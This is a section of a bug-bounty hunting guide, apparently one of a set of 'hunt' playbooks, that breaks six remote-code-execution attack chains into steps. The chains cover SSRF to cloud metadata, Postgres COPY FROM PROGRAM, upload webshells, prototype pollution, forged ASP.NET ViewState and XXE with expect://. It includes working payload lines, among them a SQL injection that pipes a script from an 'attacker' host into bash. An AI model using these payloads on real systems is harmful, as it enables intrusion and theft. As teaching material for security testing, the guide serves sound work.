## Chains & Compositions (Senior Hunting)

RCE in 2020-2026 rarely arrives at a single sink. Every modern RCE is composed of (1) a primitive that puts attacker bytes onto the host or into a deserialization pipeline, plus (2) an exec gadget that interprets them. The chains below decompose six high-paying RCE shapes into their primitive components — each step is testable in isolation, the chain is what pays.

### Chain 1 — SSRF + IMDSv1 + Leaked IAM Role → Lambda Invoke → Backend RCE (Capital One pattern)

- **A.** SSRF on a server-side fetcher (link-preview, image proxy, webhook URL, PDF generator). Confirmed via Burp Collaborator OOB callback.
- **B.** Point SSRF at AWS IMDSv1 metadata: `http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
- **C.** Use the credentials with `aws lambda invoke --function-name <internal-function>` — Lambda runs server-side code that the attacker can influence via the function's input parameter.
- **Impact:** Full backend RCE in the Lambda context, plus pivot path to whatever else the role grants (S3 / DynamoDB / RDS).
- **Real shape:** Capital One 2019 — $80M civil penalty, attacker conviction. SSRF in a WAF on EC2 → IMDSv1 → IAM role → 106M-record breach via S3 sync. Cross-refs `hunt-ssrf` Disclosed Report Citation #6.

### Chain 2 — SQLi + `COPY FROM PROGRAM` → Direct OS-level RCE on Postgres Host

- **A.** SQLi confirmed on a Postgres backend (boolean/time-based works; UNION not needed).
- **B.** The DB user has either `pg_read_server_files` or `COPY` privileges (default for many AWS RDS / Google Cloud SQL roles when "admin" databases exist).
- **C.** Stack a query: `'; COPY users FROM PROGRAM 'curl http://attacker/x.sh | bash'; --` → Postgres shells out to `/bin/sh -c <attacker command>` → RCE as `postgres` user.
- **Impact:** RCE as the database user, which on managed Postgres frequently has IAM credentials and direct access to other AWS resources.
- **Real shape:** Multiple H1 disclosures 2020-2024 across SaaS apps backed by Postgres. Cross-refs `hunt-sqli` Disclosed Report Citation #12 and root cause discussion of `FILE`/`xp_cmdshell` privileges.

### Chain 3 — Image Upload + Path Traversal in Filename + Misconfigured MIME Serving → Webshell

- **A.** File upload accepts images (`image/png`, `image/jpeg`). The server saves with the user-supplied filename or only validates Content-Type, not actual content.
- **B.** Upload a `.aspx`/`.jsp`/`.php` file with the correct image magic-bytes (`GIF89a` + PHP after) and a filename containing `../` to write outside the upload directory into the web-root (`../../../public/webshell.php`).
- **C.** Request `https://target/webshell.php?cmd=id` — server's PHP/ASP.NET handler runs the script regardless of extension policy because the path doesn't pass through the upload-dir filter.
- **Impact:** Unauthenticated or low-priv attacker gets webshell on the application server with the web-server's process privileges.
- **Real shape:** Multiple disclosed H1 cases on legacy upload handlers; canonical pre-2020 RCE class. Pairs with `hunt-file-upload` (upload bypass table) and `hunt-misc` path-traversal patterns.

### Chain 4 — Prototype Pollution + Lodash/Mongoose Gadget Chain → `child_process.spawn` → Node RCE

- **A.** Identify prototype pollution sink — JSON merge / Object.assign / lodash `_.merge` / Node `Object.create` chain receiving attacker JSON.
- **B.** Pollute `Object.prototype.shell` to `true` OR `Object.prototype.env.NODE_OPTIONS` to `--require ./malicious.js`. The polluted prototype reaches a downstream `child_process.spawn` or `vm.runInThisContext`.
- **C.** Sink executes with attacker-controlled shell/env → attacker code runs in Node.js process context with full access to environment variables, AWS metadata, internal services.
- **Impact:** Server-side JS execution from a JSON POST. Common in Express apps using `body-parser` + `lodash.merge` for config-merging.
- **Real shape:** `lodash.merge` CVE-2018-16487, CVE-2019-10744, CVE-2020-8203; `mongoose` CVE-2024-53900 (cross-refs `hunt-sqli` Disclosed Report Citation #10 — same gadget family reaches Mongo `$where` instead of process).

### Chain 5 — Unencrypted ViewState + Recovered MachineKey → ASP.NET Deserialization → RCE (ToolShell class)

- **A.** Identify an ASP.NET endpoint where `__VIEWSTATEENCRYPTED=""` (ViewState is signed but not encrypted). Confirm via Burp / curl on form-bearing pages.
- **B.** Recover the `<machineKey>` validationKey — via config leak (`/web.config` accessible), via subdomain takeover of a sibling app sharing the key, or via the CVE-2025-53771 ToolShell exploit chain that exfils the key on Subscription Edition.
- **C.** Forge a ViewState using `ysoserial.net --plugin=ViewState --validationkey=<key>` with a `TypeConfuseDelegate` / `WindowsIdentity` payload. Submit to the endpoint. ASP.NET deserialises into a method-call gadget chain ending in `Process.Start` → RCE as the worker-process identity.
- **Impact:** Full RCE on the IIS web front-end with whatever the AppPool identity grants — often `NETWORK SERVICE` (with SharePoint farm-account access) or higher.
- **Real shape:** CVE-2025-53770 / 53771 ToolShell (July 2025 emergency advisory); SP2013 unpatched-by-EoL exposure. Cross-refs `hunt-sharepoint` ToolShell precondition chain and `hunt-aspnet` ViewState dual-parser anti-pattern.

### Chain 6 — XXE + PHP `expect://` Stream Wrapper → Direct RCE on Legacy PHP

- **A.** XXE confirmed via OOB DTD callback (`<!ENTITY % x SYSTEM "http://attacker/dtd">`).
- **B.** Target runs PHP with the `expect` extension enabled (rare in 2026, but still present on legacy hosts and some shared-hosting providers).
- **C.** Send `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>` — PHP's stream wrapper executes `id` through expect → output returned in entity expansion or via OOB.
- **Impact:** RCE as the PHP/web-server user without needing a separate upload or SQLi primitive.
- **Real shape:** Rockstar Games emblem editor XXE H1 #347139 (2018, $1,500); Adobe Commerce CosmicSting CVE-2024-34102 (XXE → RCE via crypt-key exfil). Cross-refs `hunt-xxe` Disclosed Report Citation #7 and #10.

### Operator-level pattern

Every modern RCE chain has two halves: **the bytes get there** (SSRF, SQLi, upload, prototype-pollution, ViewState, XXE) and **the bytes get interpreted** (lambda invoke, COPY PROGRAM, webshell handler, child_process.spawn, deserializer gadget, expect://). Hunt for the first half; the second is usually one of the six above. If your first-half primitive doesn't compose with any of these — pause before submitting. "Could lead to RCE" is Low/Medium; "RCE demonstrated end-to-end" is Critical.

Cross-references:
- `hunt-ssrf` — Chain 1
- `hunt-sqli` — Chain 2
- `hunt-file-upload` — Chain 3
- `hunt-api-misconfig` (proto-pollution) — Chain 4
- `hunt-sharepoint` + `hunt-aspnet` — Chain 5
- `hunt-xxe` — Chain 6
- `hunt-deserialization` — YAML/XML/Ruby/Java deserialization is a parallel path to RCE. Chain primitive: SnakeYAML `!!javax.script.ScriptEngineManager` gadget with attacker-hosted JAR → RCE on any Java service processing YAML; Python pickle `__reduce__` → RCE on any Python service unpickling attacker bytes.

---

